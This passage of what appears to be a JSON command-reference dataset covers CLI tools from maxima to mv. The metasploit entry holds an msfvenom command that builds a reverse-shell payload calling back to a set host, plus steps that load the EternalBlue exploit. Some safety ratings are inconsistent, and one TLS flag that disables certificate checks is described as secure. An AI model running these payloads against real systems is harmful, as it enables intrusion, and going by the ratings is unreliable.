      "Lisp-based syntax can be unfamiliar",
      "Graphics capabilities limited compared to modern tools",
      "Documentation can be technical and dense"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://maxima.sourceforge.io/documentation.html"
      },
      {
        "platform": "macos",
        "url": "https://maxima.sourceforge.io/documentation.html"
      },
      {
        "platform": "windows",
        "url": "https://maxima.sourceforge.io/documentation.html"
      },
      {
        "platform": "generic",
        "url": "https://maxima.sourceforge.io/docs/tutorial/en/minimal-maxima.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mdadm",
    "subtitle": "Multiple Device Administrator",
    "description": "Manage Linux software RAID arrays",
    "examples": [
      "sudo mdadm --create /dev/md0 --level=1 --raid-devices=2 /dev/sdb /dev/sdc  # Create RAID 1 mirror with two devices",
      "cat /proc/mdstat  # Show status of all RAID arrays",
      "sudo mdadm --add /dev/md0 /dev/sdd  # Add spare device to RAID array",
      "sudo mdadm --remove /dev/md0 /dev/sdb  # Remove failed device from array",
      "sudo mdadm --stop /dev/md0  # Stop and deactivate RAID array",
      "sudo mdadm --detail --scan >> /etc/mdadm/mdadm.conf  # Save RAID configuration to file"
    ],
    "platform": [
      "linux"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "mdadm [options] device [devices]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "RAID array setup",
        "commands": "sudo mdadm --create /dev/md0 --level=1 --raid-devices=2 /dev/sdb /dev/sdc && sudo mkfs.ext4 /dev/md0 && sudo mdadm --detail --scan >> /etc/mdadm/mdadm.conf",
        "explanation": "Create RAID 1, format, save configuration",
        "title": "sudo && sudo && sudo >>"
      }
    ],
    "relatedCommands": [
      {
        "name": "lvm",
        "relationship": "combo",
        "reason": "Can use RAID arrays as LVM physical volumes"
      }
    ],
    "warnings": [
      "Always backup configuration file",
      "Monitor array health regularly"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/mdadm.8.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "meson",
    "subtitle": "Meson",
    "description": "Fast and user-friendly build system",
    "examples": [
      "meson setup builddir  # Initialize build directory with default settings",
      "meson compile -C builddir  # Build project in specified build directory",
      "meson test -C builddir  # Execute project test suite",
      "meson install -C builddir  # Install built project to system directories",
      "meson configure builddir -Dbuildtype=release  # Set build type to release/optimized",
      "meson --reconfigure builddir  # Reconfigure existing build directory"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "meson [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete development workflow",
        "commands": "meson setup build && meson compile -C build && meson test -C build",
        "explanation": "Setup, build, and test project",
        "title": "meson && meson && meson"
      },
      {
        "scenario": "Release build and install",
        "commands": "meson setup --buildtype=release build && meson compile -C build && sudo meson install -C build",
        "explanation": "Configure for release, build, then install",
        "title": "meson && meson && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "ninja",
        "relationship": "combo",
        "reason": "meson generates ninja build files by default"
      },
      {
        "name": "cmake",
        "relationship": "alternative",
        "reason": "Modern alternative build system generator"
      },
      {
        "name": "python3",
        "relationship": "combo",
        "reason": "meson is written in Python"
      }
    ],
    "warnings": [
      "meson.build files use Python-like syntax",
      "Out-of-source builds are required",
      "Cross-compilation support is excellent but needs setup"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://mesonbuild.com/"
      },
      {
        "platform": "macos",
        "url": "https://mesonbuild.com/"
      },
      {
        "platform": "windows",
        "url": "https://mesonbuild.com/"
      },
      {
        "platform": "generic",
        "url": "https://mesonbuild.com/Tutorial.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "metasploit",
    "subtitle": "Metasploit Framework",
    "description": "Penetration testing framework for authorized security assessments",
    "examples": [
      "msfconsole  # Launch interactive Metasploit framework console",
      "search type:exploit platform:windows  # Find Windows exploits in Metasploit database",
      "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe  # Create Windows reverse shell payload for testing",
      "use auxiliary/scanner/smb/smb_version  # Use SMB version scanner module"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "msfconsole or msfvenom [options]",
    "prerequisites": [
      "expert",
      "authorization-required"
    ],
    "commandCombinations": [
      {
        "scenario": "Authorized penetration testing workflow",
        "commands": "msfconsole -q && search ms17-010 && use exploit/windows/smb/ms17_010_eternalblue",
        "explanation": "Start framework and prepare EternalBlue exploit for testing",
        "title": "msfconsole && search && use"
      }
    ],
    "relatedCommands": [
      {
        "name": "nmap",
        "relationship": "combo",
        "reason": "Vulnerability scanning before exploitation"
      },
      {
        "name": "armitage",
        "relationship": "combo",
        "reason": "GUI frontend for Metasploit"
      }
    ],
    "warnings": [
      "Only use against systems you own or have explicit written authorization",
      "Can cause system instability or data loss",
      "Legal and ethical considerations are paramount"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://docs.rapid7.com/metasploit/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "miller",
    "subtitle": "Miller",
    "description": "Process structured data like CSV, JSON, and more",
    "examples": [
      "mlr --icsv --opprint cat data.csv  # Convert CSV to aligned table format for viewing",
      "mlr --csv filter '$age > 25' data.csv  # Show only rows where age is greater than 25",
      "mlr --csv stats1 -a mean,sum,count -f salary data.csv  # Calculate mean, sum, and count for salary column",
      "mlr --icsv --ojson cat data.csv  # Convert CSV input to JSON output format",
      "mlr --csv sort -f department,salary data.csv  # Sort by department then by salary within each department",
      "mlr --csv put '$bonus = $salary * 0.1' data.csv  # Add bonus column calculated as 10% of salary"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "data-processing",
    "safety": "safe",
    "syntaxPattern": "mlr [options] verb [parameters] file",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complex data transformation",
        "commands": "mlr --csv filter '$department == \"Sales\"' then stats1 -a mean -f salary then put '$avg_salary = $salary_mean' data.csv",
        "explanation": "Filter sales dept, calculate average salary, add as new column",
        "title": "mlr"
      },
      {
        "scenario": "Multi-format data pipeline",
        "commands": "mlr --ijson --ocsv flatten --fs . data.json | mlr --csv sort -f name",
        "explanation": "Convert nested JSON to flat CSV and sort by name",
        "title": "mlr | mlr"
      }
    ],
    "relatedCommands": [
      {
        "name": "jq",
        "relationship": "similar",
        "reason": "jq for JSON processing, miller handles multiple formats"
      },
      {
        "name": "csvkit",
        "relationship": "alternative",
        "reason": "Both process structured data, different feature sets"
      },
      {
        "name": "awk",
        "relationship": "alternative",
        "reason": "awk for text processing, miller for structured data"
      }
    ],
    "warnings": [
      "Complex syntax with many verb options",
      "Format specifiers (--icsv, --ojson) required for input/output",
      "Field names with spaces need special handling"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://miller.readthedocs.io/"
      },
      {
        "platform": "macos",
        "url": "https://miller.readthedocs.io/"
      },
      {
        "platform": "windows",
        "url": "https://miller.readthedocs.io/"
      },
      {
        "platform": "generic",
        "url": "https://miller.readthedocs.io/en/latest/10min/"
      }
    ],
    "distroNotes": {
      "linux": "Available in most package managers",
      "macos": "Install via Homebrew: brew install miller",
      "windows": "Download from GitHub releases"
    }
  },
  {
    "name": "mix",
    "subtitle": "Mix",
    "description": "Build tool for Elixir programming language",
    "examples": [
      "mix new myapp  # Generate new Elixir project",
      "mix compile  # Compile Elixir source code",
      "mix test  # Execute ExUnit test suite",
      "mix deps.get  # Download and install dependencies",
      "mix run  # Run application",
      "iex -S mix  # Start IEx with compiled project",
      "mix format  # Format Elixir source code",
      "mix help  # Show available Mix tasks"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "mix [task] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Project setup workflow",
        "commands": "mix new myapp && cd myapp && mix deps.get && mix compile && mix test",
        "explanation": "Create project, install deps, compile, and test",
        "title": "mix && cd && mix && mix && mix"
      }
    ],
    "relatedCommands": [
      {
        "name": "elixir",
        "relationship": "runtime",
        "reason": "Mix builds Elixir applications"
      },
      {
        "name": "iex",
        "relationship": "combo",
        "reason": "IEx provides interactive shell for Mix projects"
      }
    ],
    "warnings": [
      "Uses mix.exs for project configuration",
      "Excellent for Phoenix web applications",
      "Built-in support for releases and hot code upgrades"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://hexdocs.pm/mix/"
      },
      {
        "platform": "macos",
        "url": "https://hexdocs.pm/mix/"
      },
      {
        "platform": "windows",
        "url": "https://hexdocs.pm/mix/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mkdir",
    "subtitle": "make directory",
    "description": "Create directories",
    "examples": [
      "mkdir new-project  # Create a new directory in current location",
      "mkdir -p project/src/components  # Create parent directories as needed",
      "mkdir docs tests src bin  # Create several directories in one command",
      "mkdir -m 755 public  # Set directory permissions during creation",
      "mkdir backup-$(date +%Y%m%d)  # Generate directory name with current date"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "mkdir [options] <directory>...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Create project structure in one command",
        "commands": "mkdir -p project/{src,tests,docs,bin} && cd project",
        "explanation": "Create complete project layout and navigate into it",
        "title": "mkdir && cd"
      },
      {
        "scenario": "Create and immediately enter directory",
        "commands": "mkdir new-feature && cd new-feature",
        "explanation": "Make directory and navigate to it in sequence",
        "title": "mkdir && cd"
      }
    ],
    "relatedCommands": [
      {
        "name": "rmdir",
        "relationship": "opposite",
        "reason": "Remove empty directories"
      },
      {
        "name": "tree",
        "relationship": "combo",
        "reason": "Visualize directory structure after creation"
      },
      {
        "name": "touch",
        "relationship": "combo",
        "reason": "Create files after creating directories"
      }
    ],
    "warnings": [
      "mkdir fails if parent directory doesn't exist (use -p)",
      "Cannot create directory if name already exists",
      "Permission denied if you don't have write access to parent"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/mkdir.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/mkdir.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/mkdir-invocation.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mlflow",
    "subtitle": "Machine Learning Flow",
    "description": "MLflow machine learning lifecycle management platform",
    "examples": [
      "mlflow server --host 0.0.0.0 --port 5000  # Starts MLflow tracking server accessible on all interfaces",
      "mlflow run https://github.com/mlflow/mlflow-example.git -P alpha=0.5  # Runs machine learning project from Git repository with parameters",
      "mlflow ui  # Launches MLflow web interface to view experiments",
      "mlflow models serve -m models:/my-model/1 -p 1234  # Serves registered model as REST API on port 1234"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "mlflow [command] [options]",
    "prerequisites": [
      "python3",
      "pip"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete MLflow setup",
        "commands": "mlflow server --backend-store-uri sqlite:///mlflow.db --default-artifact-root ./artifacts --host 0.0.0.0 --port 5000 &",
        "explanation": "Starts MLflow server with SQLite backend and local artifact storage",
        "title": "mlflow &"
      }
    ],
    "relatedCommands": [
      {
        "name": "python3",
        "relationship": "dependency",
        "reason": "MLflow is built on Python and requires Python runtime"
      },
      {
        "name": "jupyter",
        "relationship": "complement",
        "reason": "MLflow integrates well with Jupyter notebooks for experiment tracking"
      },
      {
        "name": "docker",
        "relationship": "complement",
        "reason": "MLflow can package models in Docker containers"
      }
    ],
    "warnings": [
      "Artifact storage location must be accessible by all clients",
      "Database backend needs to be configured for multi-user scenarios",
      "Model serving requires compatible Python environment",
      "Authentication not enabled by default"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://mlflow.org/docs/latest/index.html"
      },
      {
        "platform": "macos",
        "url": "https://mlflow.org/docs/latest/index.html"
      },
      {
        "platform": "windows",
        "url": "https://mlflow.org/docs/latest/index.html"
      },
      {
        "platform": "generic",
        "url": "https://mlflow.org/docs/latest/quickstart.html"
      }
    ],
    "distroNotes": {
      "linux": "Available through pip installation",
      "windows": "Available through pip, some database backends may need configuration",
      "macos": "Available through pip installation"
    }
  },
  {
    "name": "mocha",
    "subtitle": "Mocha",
    "description": "Feature-rich JavaScript test framework",
    "examples": [
      "mocha  # Run all test files in test directory",
      "mocha test/user.test.js  # Run specific test file",
      "mocha --reporter spec  # Use spec reporter for detailed output",
      "mocha --watch  # Re-run tests when files change",
      "mocha --grep 'authentication'  # Run only tests matching pattern",
      "mocha --timeout 5000  # Set test timeout to 5 seconds"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "mocha [options] [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Test with coverage",
        "commands": "nyc mocha && nyc report --reporter=html",
        "explanation": "Run tests with Istanbul coverage and generate HTML report",
        "title": "nyc && nyc"
      }
    ],
    "relatedCommands": [
      {
        "name": "jest",
        "relationship": "alternative",
        "reason": "More batteries-included JavaScript testing framework"
      },
      {
        "name": "chai",
        "relationship": "combo",
        "reason": "chai provides assertion library commonly used with mocha"
      }
    ],
    "warnings": [
      "Requires separate assertion library like chai",
      "Very flexible but requires more configuration",
      "Multiple built-in reporters available"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://mochajs.org/"
      },
      {
        "platform": "macos",
        "url": "https://mochajs.org/"
      },
      {
        "platform": "windows",
        "url": "https://mochajs.org/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mongodump",
    "subtitle": "MongoDB Dump",
    "description": "MongoDB database backup utility",
    "examples": [
      "mongodump --db myapp --out /backup/  # Create BSON backup of specific database",
      "mongodump --db myapp --collection users --out /backup/  # Backup only specific collection",
      "mongodump --host mongodb://server:27017 --db myapp --out /backup/  # Backup database from remote MongoDB server",
      "mongodump --host localhost --username backup_user --password --authenticationDatabase admin --db myapp --out /backup/  # Backup with username/password authentication",
      "mongodump --db myapp --collection orders --query '{\"status\": \"active\"}' --out /backup/  # Backup only documents matching query",
      "mongodump --db myapp --gzip --out /backup/  # Create compressed BSON backup",
      "mongodump --db myapp --archive=backup.archive --gzip  # Create single compressed archive file",
      "mongodump --db myapp --excludeCollection=logs --excludeCollection=temp --out /backup/  # Backup database excluding certain collections"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "mongodump [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Automated backup with date",
        "commands": "mongodump --db myapp --gzip --archive=backup_$(date +%Y%m%d).archive && find /backups -name '*.archive' -mtime +7 -delete",
        "explanation": "Create dated backup and clean old backups",
        "title": "mongodump && find"
      }
    ],
    "relatedCommands": [
      {
        "name": "mongorestore",
        "relationship": "combo",
        "reason": "Restores backups created by mongodump"
      },
      {
        "name": "mongoexport",
        "relationship": "alternative",
        "reason": "Exports data in JSON/CSV format instead of BSON"
      }
    ],
    "warnings": [
      "BSON format preserves data types better than JSON",
      "Large collections may require --forceTableScan option",
      "Sharded clusters need special considerations for consistency"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.mongodb.com/docs/database-tools/mongodump/"
      },
      {
        "platform": "macos",
        "url": "https://www.mongodb.com/docs/database-tools/mongodump/"
      },
      {
        "platform": "windows",
        "url": "https://www.mongodb.com/docs/database-tools/mongodump/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mongoexport",
    "subtitle": "MongoDB Export",
    "description": "MongoDB data export utility for JSON/CSV formats",
    "examples": [
      "mongoexport --db myapp --collection users --out users.json  # Export entire collection to JSON file",
      "mongoexport --db myapp --collection users --type=csv --fields=name,email,created --out users.csv  # Export specific fields to CSV file",
      "mongoexport --db myapp --collection orders --query '{\"status\": \"completed\"}' --out completed_orders.json  # Export only documents matching query",
      "mongoexport --host mongodb://server:27017 --db myapp --collection users --out users.json  # Export data from remote MongoDB server",
      "mongoexport --db myapp --collection users --pretty --out users_pretty.json  # Export with formatted JSON output",
      "mongoexport --username export_user --password --authenticationDatabase admin --db myapp --collection users --out users.json  # Export with username/password authentication",
      "mongoexport --db myapp --collection users --sort '{\"created\": -1}' --limit 1000 --out recent_users.json  # Export top 1000 most recent users"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "mongoexport [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Data analysis workflow",
        "commands": "mongoexport --db myapp --collection analytics --query '{\"date\": {\"$gte\": new Date(\"2023-01-01\")}}' --type=csv --fields=date,views,clicks --out analytics.csv && head -20 analytics.csv",
        "explanation": "Export analytics data to CSV and preview",
        "title": "mongoexport && head"
      }
    ],
    "relatedCommands": [
      {
        "name": "mongoimport",
        "relationship": "combo",
        "reason": "Imports JSON/CSV data exported by mongoexport"
      },
      {
        "name": "mongodump",
        "relationship": "alternative",
        "reason": "Creates BSON backups instead of JSON/CSV"
      }
    ],
    "warnings": [
      "CSV export requires explicit field specification",
      "JSON export preserves MongoDB data types",
      "Large exports may require pagination with skip/limit"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.mongodb.com/docs/database-tools/mongoexport/"
      },
      {
        "platform": "macos",
        "url": "https://www.mongodb.com/docs/database-tools/mongoexport/"
      },
      {
        "platform": "windows",
        "url": "https://www.mongodb.com/docs/database-tools/mongoexport/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mongoimport",
    "subtitle": "MongoDB Import",
    "description": "MongoDB data import utility for JSON/CSV formats",
    "examples": [
      "mongoimport --db myapp --collection users --file users.json  # Import JSON documents into collection",
      "mongoimport --db myapp --collection users --type=csv --headerline --file users.csv  # Import CSV file using first row as field names",
      "mongoimport --db myapp --collection users --type=csv --fields=name,email,age --file users.csv  # Import CSV with explicit field names",
      "mongoimport --db myapp --collection users --jsonArray --file users_array.json  # Import file containing JSON array of documents",
      "mongoimport --db myapp --collection users --upsert --upsertFields=email --file users.json  # Update existing documents or insert new ones based on email field",
      "mongoimport --host mongodb://server:27017 --db myapp --collection users --file users.json  # Import data to remote MongoDB server",
      "mongoimport --db myapp --collection users --drop --file users.json  # Remove existing collection data before importing",
      "mongoimport --username import_user --password --authenticationDatabase admin --db myapp --collection users --file users.json  # Import with username/password authentication"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "mongoimport [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Data migration pipeline",
        "commands": "mongoexport --host old_server --db legacy --collection users --out users.json && mongoimport --host new_server --db modern --collection users --file users.json",
        "explanation": "Export from old system and import to new system",
        "title": "mongoexport && mongoimport"
      }
    ],
    "relatedCommands": [
      {
        "name": "mongoexport",
        "relationship": "combo",
        "reason": "Exports data that mongoimport can import"
      },
      {
        "name": "mongorestore",
        "relationship": "alternative",
        "reason": "Restores BSON data instead of JSON/CSV"
      }
    ],
    "warnings": [
      "CSV imports require proper field mapping",
      "Upsert operations can be slower than regular inserts",
      "Large files should be split to avoid memory issues"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.mongodb.com/docs/database-tools/mongoimport/"
      },
      {
        "platform": "macos",
        "url": "https://www.mongodb.com/docs/database-tools/mongoimport/"
      },
      {
        "platform": "windows",
        "url": "https://www.mongodb.com/docs/database-tools/mongoimport/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mongorestore",
    "subtitle": "MongoDB Restore",
    "description": "MongoDB database restore utility",
    "examples": [
      "mongorestore --db myapp /backup/myapp/  # Restore database from BSON backup directory",
      "mongorestore --db myapp --collection users /backup/myapp/users.bson  # Restore single collection from backup",
      "mongorestore --db newapp /backup/myapp/  # Restore backup to database with different name",
      "mongorestore --archive=backup.archive --gzip  # Restore from compressed archive file",
      "mongorestore --drop --db myapp /backup/myapp/  # Drop existing collections before restoring",
      "mongorestore --host mongodb://server:27017 --db myapp /backup/myapp/  # Restore backup to remote MongoDB server",
      "mongorestore --numParallelCollections=4 --db myapp /backup/myapp/  # Use multiple threads for faster restore",
      "mongorestore --username restore_user --password --authenticationDatabase admin --db myapp /backup/myapp/  # Restore with username/password authentication"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "mongorestore [options] [directory/file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Database migration workflow",
        "commands": "mongodump --host old_server --db myapp --archive | mongorestore --host new_server --archive",
        "explanation": "Stream backup directly to restore on different server",
        "title": "mongodump | mongorestore"
      }
    ],
    "relatedCommands": [
      {
        "name": "mongodump",
        "relationship": "combo",
        "reason": "Creates backups that mongorestore can restore"
      },
      {
        "name": "mongoimport",
        "relationship": "alternative",
        "reason": "Imports JSON/CSV data instead of BSON"
      }
    ],
    "warnings": [
      "Index creation can be slow during restore",
      "--drop option removes existing data permanently",
      "Sharded collections may require specific restore procedures"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.mongodb.com/docs/database-tools/mongorestore/"
      },
      {
        "platform": "macos",
        "url": "https://www.mongodb.com/docs/database-tools/mongorestore/"
      },
      {
        "platform": "windows",
        "url": "https://www.mongodb.com/docs/database-tools/mongorestore/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mongosh",
    "subtitle": "MongoDB Shell",
    "description": "MongoDB Shell - modern interactive JavaScript interface",
    "examples": [
      "mongosh  # Connect to MongoDB on localhost:27017",
      "mongosh mongodb://localhost/myapp  # Connect directly to specific database",
      "mongosh 'mongodb://user:password@server:27017/database'  # Connect to remote MongoDB with authentication",
      "mongosh --file script.js  # Run MongoDB commands from JavaScript file",
      "mongosh --eval 'db.users.find()'  # Run one MongoDB command and exit",
      "mongosh --tls --tlsAllowInvalidCertificates  # Connect using TLS/SSL encryption"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "mongosh [options] [connection-string]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Backup MongoDB collection",
        "commands": "mongodump --db myapp --collection users && tar -czf users-backup.tar.gz dump/",
        "explanation": "Backup specific collection and compress",
        "title": "mongodump && tar"
      },
      {
        "scenario": "Import JSON data",
        "commands": "mongoimport --db myapp --collection products --file products.json",
        "explanation": "Import JSON file into MongoDB collection",
        "title": "mongoimport"
      }
    ],
    "relatedCommands": [
      {
        "name": "mongodump",
        "relationship": "combo",
        "reason": "Create MongoDB database backups"
      },
      {
        "name": "mongoimport",
        "relationship": "combo",
        "reason": "Import data into MongoDB"
      },
      {
        "name": "mongo",
        "relationship": "alternative",
        "reason": "Legacy MongoDB shell (deprecated)"
      }
    ],
    "warnings": [
      "mongosh uses modern JavaScript syntax unlike legacy mongo shell",
      "Connection strings must be quoted if they contain special characters",
      "Some legacy mongo commands may not work in mongosh"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.mongodb.com/docs/mongodb-shell/"
      },
      {
        "platform": "macos",
        "url": "https://www.mongodb.com/docs/mongodb-shell/"
      },
      {
        "platform": "windows",
        "url": "https://www.mongodb.com/docs/mongodb-shell/"
      },
      {
        "platform": "generic",
        "url": "https://www.mongodb.com/docs/mongodb-shell/reference/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mosquitto",
    "subtitle": "Mosquitto MQTT Broker",
    "description": "Eclipse Mosquitto MQTT broker",
    "examples": [
      "mosquitto  # Starts Mosquitto MQTT broker with default configuration",
      "mosquitto -c /etc/mosquitto/mosquitto.conf  # Starts broker using specified configuration file",
      "mosquitto -p 1884  # Starts MQTT broker on port 1884 instead of default 1883"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "mosquitto [options]",
    "prerequisites": [
      "openssl-optional"
    ],
    "commandCombinations": [
      {
        "scenario": "Start broker and test with pub/sub",
        "commands": "mosquitto -d && mosquitto_pub -t test -m 'Hello' && mosquitto_sub -t test",
        "explanation": "Starts broker as daemon, publishes test message, and subscribes to topic",
        "title": "mosquitto && mosquitto_pub && mosquitto_sub"
      },
      {
        "scenario": "Secure MQTT setup",
        "commands": "mosquitto -c /etc/mosquitto/mosquitto.conf -d && mosquitto_pub -h localhost -p 8883 --cafile ca.crt -t secure/test -m 'secure message'",
        "explanation": "Starts broker with TLS config and publishes secure message",
        "title": "mosquitto && mosquitto_pub"
      }
    ],
    "relatedCommands": [
      {
        "name": "mosquitto_pub",
        "relationship": "client",
        "reason": "MQTT publisher client for sending messages to Mosquitto broker"
      },
      {
        "name": "mosquitto_sub",
        "relationship": "client",
        "reason": "MQTT subscriber client for receiving messages from Mosquitto broker"
      },
      {
        "name": "node-red",
        "relationship": "complement",
        "reason": "Visual programming tool that often uses MQTT brokers for IoT workflows"
      }
    ],
    "warnings": [
      "Default configuration may not allow anonymous connections",
      "Port 1883 must be available and not blocked by firewall",
      "Configuration file syntax is sensitive to whitespace",
      "TLS certificates must be properly configured for secure connections"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://mosquitto.org/documentation/"
      },
      {
        "platform": "macos",
        "url": "https://mosquitto.org/documentation/"
      },
      {
        "platform": "windows",
        "url": "https://mosquitto.org/documentation/"
      },
      {
        "platform": "generic",
        "url": "https://mosquitto.org/man/mosquitto-8.html"
      }
    ],
    "distroNotes": {
      "windows": "Available through official Windows installer",
      "linux": "Available in most distribution repositories",
      "macos": "Can be installed via Homebrew"
    }
  },
  {
    "name": "mount",
    "subtitle": "Mount",
    "description": "Mount filesystems to directory tree",
    "examples": [
      "sudo mount /dev/sdb1 /mnt/usb  # Mount USB device to /mnt/usb directory",
      "sudo mount -t ext4 /dev/sdc1 /mnt/data  # Mount device specifying ext4 filesystem type",
      "sudo mount -o ro /dev/sdb1 /mnt/readonly  # Mount filesystem in read-only mode",
      "mount  # Display all currently mounted filesystems",
      "sudo mount -o loop disk.iso /mnt/iso  # Mount ISO file as loopback device",
      "sudo mount -o remount,rw /dev/sdb1  # Remount filesystem with read-write permissions"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "system",
    "safety": "caution",
    "syntaxPattern": "mount [options] device mountpoint",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Safe USB mount",
        "commands": "sudo mkdir -p /mnt/usb && sudo mount /dev/sdb1 /mnt/usb && ls /mnt/usb",
        "explanation": "Create mount point, mount USB, and list contents",
        "title": "sudo && sudo && ls"
      }
    ],
    "relatedCommands": [
      {
        "name": "umount",
        "relationship": "combo",
        "reason": "umount unmounts filesystems mounted by mount"
      },
      {
        "name": "lsblk",
        "relationship": "complementary",
        "reason": "lsblk helps identify devices to mount"
      }
    ],
    "warnings": [
      "Requires root privileges for most operations",
      "Mount point directory must exist before mounting",
      "Always umount before physically disconnecting devices"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/mount.8.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/mount.html"
      },
      {
        "platform": "windows",
        "url": "Different approach (drive letters)"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mtr",
    "subtitle": "My TraceRoute",
    "description": "Network diagnostic combining ping and traceroute",
    "examples": [
      "mtr google.com  # Real-time interactive traceroute to google.com",
      "mtr --report --report-cycles 10 google.com  # Generate report with 10 cycles then exit",
      "mtr -n google.com  # Skip DNS lookups for faster results",
      "mtr -6 google.com  # Force IPv6 traceroute",
      "mtr -s 1000 google.com  # Use 1000-byte packets for testing"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "mtr [options] hostname",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Network quality assessment",
        "commands": "mtr --report -c 100 8.8.8.8 > network_report.txt",
        "explanation": "Generate detailed network quality report",
        "title": "mtr > network_report"
      }
    ],
    "relatedCommands": [
      {
        "name": "traceroute",
        "relationship": "similar",
        "reason": "Both trace network paths but mtr provides continuous updates"
      },
      {
        "name": "ping",
        "relationship": "similar",
        "reason": "Both test connectivity but mtr shows full path"
      }
    ],
    "warnings": [
      "May require root privileges for some packet types",
      "Some routers block ICMP affecting results",
      "Results can vary due to load balancing"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.bitwizard.nl/mtr/"
      },
      {
        "platform": "macos",
        "url": "https://www.bitwizard.nl/mtr/"
      },
      {
        "platform": "windows",
        "url": "https://www.bitwizard.nl/mtr/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mv",
    "subtitle": "move",
    "description": "Move or rename files and directories",
    "examples": [
      "mv oldname.txt newname.txt  # Change filename while keeping in same directory",
      "mv report.pdf documents/  # Relocate file to another folder",
      "mv *.log logs/  # Move all log files to logs directory",
      "mv old-project new-project  # Rename entire directory and contents",
      "mv -i *.txt archive/  # Prompt before overwriting existing files"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "caution",
    "syntaxPattern": "mv <source> <destination>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Move and create destination directory",
